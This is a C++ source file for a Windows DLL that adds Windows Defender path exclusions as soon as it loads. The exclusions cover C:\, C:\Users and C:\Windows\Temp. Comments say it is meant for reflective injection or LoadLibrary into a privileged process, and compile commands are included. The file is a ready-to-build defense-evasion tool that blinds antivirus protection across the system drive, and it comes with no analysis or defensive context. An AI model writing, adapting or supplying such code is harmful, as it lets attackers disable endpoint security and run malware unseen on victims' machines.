#include <windows.h>

// DLL version — runs exclusion on DllMain attach
// For use with reflective injection or standard LoadLibrary
// Requires: Admin or SYSTEM in target process

bool AddDefenderExclusion(const wchar_t* path) {
    HKEY hKey;
    LSTATUS status = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (status != ERROR_SUCCESS) return false;

    DWORD val = 0;
    status = RegSetValueExW(
        hKey,
        path,
        0,
        REG_DWORD,
        (BYTE*)&val,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);
    return status == ERROR_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        AddDefenderExclusion(L"C:\\");
        AddDefenderExclusion(L"C:\\Users");
        AddDefenderExclusion(L"C:\\Windows\\Temp");
    }
    return TRUE;
}

// Compile as DLL:
//   MSVC:  cl /LD exclusion_dll.cpp advapi32.lib /Fe:exclusion.dll
//   MinGW: g++ -shared -o exclusion.dll exclusion_dll.cpp -ladvapi32
